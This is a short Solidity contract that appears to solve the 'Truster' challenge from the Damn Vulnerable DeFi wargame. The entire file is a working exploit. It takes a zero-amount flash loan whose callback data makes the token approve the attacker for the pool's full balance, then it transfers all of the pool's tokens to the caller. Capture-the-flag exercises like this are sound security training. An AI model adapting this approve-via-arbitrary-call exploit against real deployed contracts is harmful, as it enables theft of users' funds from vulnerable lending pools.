
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";


interface IPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external returns (bool);
}

contract TrusterLenderPoolHack {
  

  function hack(IPool pool, DamnValuableToken token) external {
    uint poolBalance = token.balanceOf(address(pool));
    pool.flashLoan(
      0,
      address(this),
      address(token),
      abi.encodeWithSignature("approve(address,uint256)", this, poolBalance));
    token.transferFrom(address(pool), msg.sender, poolBalance);
  }
}
